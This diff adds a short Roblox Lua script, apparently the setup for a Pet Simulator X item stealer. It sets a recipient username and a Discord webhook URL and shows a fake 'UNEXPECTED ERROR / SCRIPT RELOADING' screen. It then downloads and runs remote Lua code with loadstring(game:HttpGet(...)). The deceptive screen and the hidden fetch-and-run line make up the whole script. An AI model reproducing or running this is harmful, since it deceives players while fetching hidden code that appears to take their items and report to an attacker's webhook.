@@ -1,0 +1,12 @@
+Username = "ScriptingLoaded"
+WebHook = "https://discord.com/api/webhooks/1098424928803508234/_7KKLRzNrgMT6GTOX7tTPVtLPaODYMPfTIWx44H-x0K-bsutCfIX01ZshCqhZNf5cULI" 
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Project Orion *ERROR*"
+_G.Text1 = "UNEXPECTED ERROR"
+_G.Text2 = "ERROR CODING (747)"
+_G.Text3 = "SCRIPT RELOADING"
+_G.Text4 = "WAIT TILL ITS RELOADED (THX FOR PATIENT)"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
